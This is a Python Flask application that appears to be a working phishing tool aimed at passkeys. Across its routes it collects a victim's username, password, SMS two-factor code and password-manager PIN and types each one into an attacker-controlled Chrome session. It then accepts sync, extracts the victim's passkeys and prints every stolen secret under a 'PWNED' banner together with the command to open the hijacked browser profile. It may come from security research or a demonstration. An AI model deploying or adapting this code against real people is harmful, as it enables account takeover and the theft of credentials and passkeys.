# Importing flask module in the project is mandatory
# An object of Flask class is our WSGI application.
import time

from flask import Flask, request, redirect, url_for, render_template

from passkeyphishing.chrome import Chrome

# Flask constructor takes the name of
# current module (__name__) as argument.
app = Flask(__name__)


chrome_browser = Chrome()

# The route() function of the Flask class is a decorator,
# which tells the application which URL should call
# the associated function.
@app.route('/')
# ‘/’ URL is bound with hello_world() function.
def index():
    # Reset our Chrome
    chrome_browser.restart_chrome()
    return render_template("index.html")


@app.post('/password')
def password():
    print(request.form)
    username = request.form.get('username')
    if username is None:
        return redirect(url_for('index'))
    print(f"1. Got username {username}")
    chrome_browser.enter_text(username.encode())
    return render_template("password.html", username=username)

@app.post('/verify')
def verify():
    print(request.form)
    username = request.form.get('username')
    password = request.form.get('password')
    if username is None or password is None:
        return redirect(url_for('index'))
    print(f"2. Got password {password}")
    chrome_browser.enter_text(password.encode())
    return render_template("verify.html", username=username, password=password)


@app.post('/sms')
def sms():
    print(request.form)
    username, password = request.form.get('username'), request.form.get('password')
    if username is None or password is None:
        return redirect(url_for(''))
    print(f"3. Showing screen to select SMS 2FA {username}")
    return render_template("sms.html", username=username, password=password)

@app.post('/pmpin')
def pmpin():
    username, password, phone = request.form.get('username'), request.form.get('password'), request.form.get('phone')

    # Enter the pin
    print(f"4. Entering SMS code ({phone}) for {username}")
    chrome_browser.enter_text(phone.encode())
    return render_template("password_manager_pin.html", username=username, password=password, phone=phone)


@app.post('/pwned')
def pwned():
    print(request.form)
    password_manager_pin = "".join(request.form.getlist('pin[]'))
    username, password, phone = request.form.get('username'), request.form.get('password'), request.form.get('phone')

    # Have we phished everything?
    if username is None or password is None:
        return redirect(url_for('index'))

    chrome_browser.agree_to_sync()

    # All should be good, get the keys
    passkeys = chrome_browser.get_passkeys()

    print(f"******** PWNED *******")
    print(f"\t{username}\t{password}\t{phone}")
    print(f"\tPassword Manager PIN: {password_manager_pin}")
    print("Passkeys:")
    print(*passkeys, sep='\n')
    print("\n"
          f"\tcmd: google-chrome --user-data-dir={chrome_browser.tmp_dir}\n")
    print("-"*50)
    return render_template("pwned.html", username=username, password=password, phone=phone,
                           password_manager_pin=password_manager_pin,
                           passkeys=passkeys)

# main driver function
if __name__ == '__main__':

    # run() method of Flask class runs the application
    # on the local development server.
    app.run(debug=True)